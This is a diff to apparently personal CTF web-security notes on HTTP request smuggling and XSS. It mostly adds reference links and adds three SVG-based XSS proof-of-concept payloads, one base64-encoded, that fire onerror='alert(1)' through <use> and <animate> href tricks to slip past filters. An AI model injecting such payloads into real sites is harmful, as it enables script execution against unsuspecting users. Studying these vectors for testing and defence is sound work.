@@ -466,8 +466,10 @@ sys.stdout.buffer.write(bytes(str(hex(len(o)-7))[2:], "ascii") + b"\r\n" + o)' ~
 ~/code/snippets/ctf/web/request_smuggling_cl_cl.txt
 ```
 
+- [GitHub \- defparam/smuggler: Smuggler \- An HTTP Request Smuggling / Desync testing tool written in Python 3](https://github.com/defparam/smuggler)
 - https://book.hacktricks.xyz/pentesting-web/http-request-smuggling
 - https://www.imperva.com/blog/http-desync-attacks-and-defence-methods/
+- https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf
 
 ### Upgrade protocol
 
@@ -508,6 +510,10 @@ sys.stdout.buffer.write(bytes(str(hex(len(o)-7))[2:], "ascii") + b"\r\n" + o)' ~
 - ~/code/snippets/ctf/web/xmlrequest.js
 
 - https://localdomain.pw/Tiny-XSS-Payloads/
+- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
+- https://github.com/snovvcrash/cheatsheets#xss
+- ~/code/guides/ctf/WebBook/HTTP/XSS学习.md
+
 - https://netsec.expert/2020/02/01/xss-in-2020.html
 - https://security.stackexchange.com/questions/162436/example-of-reflected-client-xss-which-is-not-dom-based-xss
 
@@ -603,8 +609,17 @@ xhr.send();
 </script>
 ```
 
-- https://github.com/snovvcrash/cheatsheets#xss
-- ~/code/guides/ctf/WebBook/HTTP/XSS学习.md
+SVG:
+
+```html
+<svg><use href="data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzEwMCcgaGVpZ2h0PScxMDAnPgo8aW1hZ2UgaHJlZj0iMSIgb25lcnJvcj0iYWxlcnQoMSkiIC8+Cjwvc3ZnPg==#x" /></svg>
+
+<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><image href='1' onerror='alert(1)' /></svg>#x" />
+
+<svg><animate xlink:href="#x" attributeName="href" values="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'>
+<image href='1' onerror='alert(1)' /></svg>#x" />
+<use id=x />
+```
 
 Mitigations:
 
